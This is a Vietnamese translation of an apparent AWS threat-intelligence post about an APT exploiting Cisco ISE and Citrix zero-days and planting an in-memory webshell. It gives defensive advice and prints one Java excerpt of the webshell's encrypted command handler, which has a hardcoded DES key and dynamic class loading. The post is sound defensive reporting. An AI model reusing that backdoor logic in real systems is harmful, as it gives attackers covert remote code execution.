---
title: "Amazon phát hiện APT khai thác zero-day của Cisco và Citrix"
date: 2025-11-28
draft: false
tags: ["AWS", "Security", "Zero-Day", "APT", "Cisco", "Citrix", "Threat Intelligence"]
categories: ["AWS", "Security and Networking"]
author: "Akihiro Nakajima"
description: "Amazon phát hiện APT khai thác 2 lỗ hổng zero-day CVE-2025-20337 (Cisco ISE) và CVE-2025-5777 (Citrix), deploy custom webshell và thực hiện patch-gap attack"
---

## Thông tin bài viết
- **Tác giả**: Akihiro Nakajima (translated)
- **Ngày xuất bản**: 28/11/2025
- **Tags**: AWS, Security, Zero-Day, APT, Cisco, Citrix
- **Nguồn**: [AWS Security Blog](https://aws.amazon.com/jp/blogs/news/amazon-discovers-apt-exploiting-cisco-and-citrix-zero-days/)

## Tóm tắt

MadPot honeypot và Threat Intelligence team của Amazon phát hiện APT (Advanced Persistent Threat) khai thác lỗ hổng zero-day của Cisco ISE và Citrix. Hai lỗ hổng CVE-2025-20337 và CVE-2025-5777 bị khai thác ở môi trường thực, custom webshell được deploy với khả năng detection evasion cao cấp.

## 10 điểm chính

1. **MadPot honeypot** phát hiện khai thác zero-day CVE-2025-5777 (Citrix Bleed Two)
2. Phát hiện **lỗ hổng chưa được document của Cisco ISE** (CVE-2025-20337), báo cáo cho Cisco
3. Threat actor có thể **RCE không cần authentication** và lấy admin access
4. **Patch-gap attack**: Khai thác xảy ra trước khi CVE được assign
5. Custom webshell **"IdentityAuditAction"** giả dạng component chính thức
6. **Hoàn toàn in-memory**, minimize forensic artifact
7. Sử dụng **Java reflection**, monitor tất cả HTTP request của Tomcat server
8. **Non-standard Base64 encoding + DES encryption** bảo vệ communication
9. Khai thác nhiều zero-day cho thấy **APT group có resource dồi dào**
10. **Identity management system và remote access gateway** là target chính

## Giới thiệu

Threat Intelligence team của Amazon phát hiện advanced threat actor đang khai thác lỗ hổng zero-day chưa được công bố của Cisco Identity Service Engine (ISE) và Citrix system.

Trong attack campaign này, custom malware được sử dụng và việc khai thác nhiều lỗ hổng chưa được công bố được xác nhận. Phát hiện này cho thấy xu hướng threat actor nhắm mục tiêu vào critical identity và network access control infrastructure (hệ thống mà doanh nghiệp phụ thuộc để thực thi security policy và quản lý authentication trên toàn bộ network).

## Phát hiện ban đầu

### Phát hiện bởi MadPot

MadPot honeypot service của Amazon phát hiện exploit attempt khai thác **Citrix Bleed Two vulnerability (CVE-2025-5777) trước khi nó được công bố**. Điều này cho thấy threat actor đã **khai thác vulnerability này như zero-day**.

### Phát hiện lỗ hổng Cisco

Threat Intelligence team của Amazon điều tra sâu về threat đang khai thác vulnerability của Citrix. Kết quả là phát hiện attack payload nhắm vào **endpoint sử dụng deserialization logic dễ bị tấn công của Cisco ISE (chưa được document vào thời điểm đó)**, và chia sẻ cho Cisco.

### Chi tiết CVE-2025-20337

Vulnerability này hiện được chỉ định là **CVE-2025-20337**, cho phép threat actor **thực thi code từ xa (RCE) không cần authentication** trên Cisco ISE và **lấy admin-level access** vào hệ thống bị xâm nhập.

### Patch-gap attack

Đặc biệt đáng lo ngại là exploit đã **xảy ra trong môi trường thực trước khi** Cisco assign CVE number hoặc release comprehensive patch cho tất cả version bị ảnh hưởng của Cisco ISE.

Kỹ thuật này được gọi là **"patch-gap attack"**, là thủ đoạn điển hình của advanced attack group. Họ liên tục theo dõi security information được vendor công bố và tấn công vào khoảng trống thời gian trước khi patch được phân phối đến tất cả user.

## Deploy custom webshell

### Giả dạng component chính thức

Sau khi exploit thành công, threat actor deploy custom webshell giả dạng **IdentityAuditAction** - tên của Cisco ISE component chính thức.

Đây không phải typical off-the-shelf malware mà là **custom-built backdoor được thiết kế riêng cho môi trường Cisco ISE**.

### Detection evasion capability cao cấp

Webshell này có detection evasion capability cao cấp:

#### In-memory operation
- **Hoàn toàn in-memory operation**, minimize forensic artifact (흔적)

#### Java Reflection
- **Sử dụng Java reflection** để inject vào running thread

#### HTTP Listener
- Đăng ký như listener **monitor tất cả HTTP request của toàn bộ Tomcat server**

#### Encrypted communication
- Implement **DES encryption sử dụng non-standard Base64 encoding**
- Cơ chế **chỉ có thể access khi specify đúng specific HTTP header**

### Ví dụ authentication code

Đây là một phần code verify secret authentication key để threat actor access vào webshell của mình:

```java
if (matcher.find()) {
    requestBody = matcher.group(1).replace("*", "a").replace("$", "l");
    Cipher encodeCipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
    decodeCipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
    byte[] key = "d384922c".getBytes();
    encodeCipher.init(1, new SecretKeySpec(key, "DES"));
    decodeCipher.init(2, new SecretKeySpec(key, "DES"));
    byte[] data = Base64.getDecoder().decode(requestBody);
    data = decodeCipher.doFinal(data);
    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
    if (proxyClass == null) {
        proxyClass = this.defineClass(data);
    } else {
        Object f = proxyClass.newInstance();
        f.equals(arrOut);
        f.equals(request);
        f.equals(data);
        f.toString();
    }
}
```

Code này cho thấy implementation cao cấp: extract encrypted command từ request body, thực hiện DES decryption, và dynamically load rồi execute class.

## Security implications

### Quy mô zero-day exploitation

Như đã đề cập, Threat Intelligence team của Amazon thông qua MadPot honeypot xác nhận threat actor đã **khai thác cả CVE-2025-20337 và CVE-2025-5777 như zero-day**, và tại thời điểm điều tra, họ đang **target Internet indiscriminately** sử dụng các vulnerability này.

### Evolving tactics

Thông qua attack campaign này, **evolving tactics của threat actor nhắm vào critical enterprise infrastructure ở network edge** đã được tiết lộ.

### Technical expertise

Custom tool của threat actor cho thấy **kiến thức sâu về nhiều technical layer**:

- Enterprise Java application
- Infrastructure technology như Tomcat server
- Architecture riêng của Cisco Identity Service Engine

Có thể thấy họ hiểu chi tiết về tất cả những điều này.

### Resource-rich actor

Việc **sử dụng nhiều unpublished zero-day exploit** cho thấy một trong những điều sau:

- Có capability nghiên cứu vulnerability cao cấp
- Có nguồn thông tin vulnerability không công khai
- Là threat actor có resource dồi dào

## Khuyến nghị cho security team

### Target chính

Đối với security team, đây là nhắc nhở rằng **identity management system và remote access gateway và các critical infrastructure component khác vẫn là target chính của threat actor**.

### Risk của authentication bypass

Vì các exploit này **có thể execute mà không cần authentication**, ngay cả hệ thống được cấu hình đúng và maintain cẩn thận nếu publicly accessible vẫn dễ bị tấn công.

### Khuyến nghị hạn chế access

Khuyến nghị **hạn chế access đến privileged security appliance endpoint như admin portal thông qua firewall hoặc multi-layer access**.

## Vendor reference

### Citrix
- [NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2025-5349 and CVE-2025-5777](https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420)

### Cisco
- [Cisco Identity Services Engine Unauthenticated Remote Code Execution Vulnerabilities](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-unauth-rce-ZAd2GnJ6)

## Kết luận

Phát hiện này nhấn mạnh **tầm quan trọng của vigilance liên tục và defense-in-depth để bảo vệ critical entry point của enterprise network**.

Advanced threat actor tiếp tục actively explore và exploit vulnerability của identity management và network access control system, các tổ chức cần strengthen protection cho các critical system này.

---

**Để được hỗ trợ, liên hệ [AWS Support](https://console.aws.amazon.com/support/home).**
